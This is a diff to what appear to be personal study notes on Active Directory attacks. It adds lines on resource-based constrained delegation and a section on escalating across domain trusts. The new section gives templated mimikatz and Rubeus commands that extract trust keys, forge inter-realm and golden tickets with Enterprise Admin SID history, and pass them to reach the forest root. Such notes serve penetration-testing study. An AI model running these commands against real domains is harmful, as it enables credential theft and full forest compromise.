@@ -14,6 +14,25 @@
 - Unconstrained and Constrained Delegation Requires `SeEnableDelegation` privilege, which is only available to Domain Admins and Enterprise Admins. 
 - Constrained Delegation is detemined by `msds-allowedtodelegateto` field in user proerty. If the user account who is allowed to delegate is compromised then, attacker can impersonate as *any user* and *any service* on the target server where Constrained delegation is allowed.
 - Resource Based Constrained Delegation (RBCD) is configured the other way around. The resource who's service is being accessed, configures the delegation.
+    - The SID value of `msDS-AllowedToActOnBehalfOfOtherIdentity` (visiable as `PrincipalsAllowedToDelegateToAccount` when configuring RBCD using AD module) attribute on the service account determines who can delegate.
 - RBCD abuse requires two steps, unlike other delegation types where it is already configured, RBCD abuse requires 
-    - First configure the RBCD for an account where `GenericAll` or `GenericWrite` is available. 
+    - First configure the RBCD for an account where `GenericAll` or `GenericWrite` is available. The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute is to be configured for the target account.
     - The target object must have an SPN configured. A domain user can create and configure a machine account (Upto 10, [**_yes fake computer accounts are allowed to be created_**](https://www.youtube.com/watch?v=RUbADHcBLKg))
+
+## Privilege Escalation across trust relationships
+
+### Trust-key Abuse
+Trust key can be extracted by any of below mimikatz command variants. By default, all trust keys within forest use RC4 encyption, so we have to use `/RC4` parameter when utilizing mimikatz to abuse trust keys.
+- `lsadump::trust /patch` (In trust-key is required , marked as `Child Domain -> Parent Domain`)
+- `lsadump::dcsync /user:<Child domain netbios name>\<Parent domain netbios name>$`
+- `lsadump::lsa /patch`
+
+### sIDHistory Injection
+The kerberos golden module is used to abuse the sIDHistory feature. The trust-key obtained from previous step will be required to sign the ticket and is passed to the parent domain. The below mimikatz command is to forge an inter-realm TGT. Using the forged TGT, TGS can be requested for parent domain DC. 
+- `kerberos::golden /domain:<FQDN of current domain> /sid:<Current domain SID> /sids:<sIDHistory of Enterprise Admin group> /rc4:<trust key> /user:<impersonate user>
+/service:krbtgt /target:<parent domain> /ticket:<path/to/ticket.kirbi>`
+- `Rubeus.exe asktgs /ticket:<path/to/ticket.kirbi> /service:<service/parent DC FQDN> /dc:<Parent DC FQDN> /ptt`
+
+### Abuse of krbtgt hash of child-domain
+Here we are forcefully setting Enterprise Admin's SID for current child domain. This TGT will have a SID history of Enterprise Admin's group which will allow access to forest root DC.
+- `kerberos::golden /user:<impersonate user> /domain:<current domain FQDN> /sid:<current domain SID> /sids:<sIDHistory of Enterprise Admin group> /krbtgt:<current domain krbtgt hash> /ticket:<path\to\ticket.kirbi>` 
